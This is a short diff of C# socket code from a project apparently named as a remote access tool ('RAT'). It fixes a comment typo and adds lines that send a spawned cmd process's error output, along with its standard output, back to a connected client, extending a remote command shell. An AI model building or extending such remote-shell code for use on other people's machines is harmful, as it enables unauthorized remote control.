@@ -13,7 +13,7 @@ namespace RAT.src.Sockets
     public class SocketConnectionLogic
     {
         /// <summary>
-        ///  Out client state, the one who connected.
+        ///  Our client state, the one who connected.
         /// </summary>
         private StateObject _clientState { get; set; }
 
@@ -44,10 +44,12 @@ namespace RAT.src.Sockets
 
             // Cmd output handler which will redirect output result to client after command is executed.
             _clientState.ClientCmdProcess.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+            _clientState.ClientCmdProcess.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
 
             // Launch cmd process.
             _clientState.ClientCmdProcess.Start();
             _clientState.ClientCmdProcess.BeginOutputReadLine();
+            _clientState.ClientCmdProcess.BeginErrorReadLine();
 
             // We are ready to accept cmd commands.
             handler.BeginReceive(_clientState.DataArray, 0, _clientState.DataArray.Length, 0, OnReceive, _clientState);
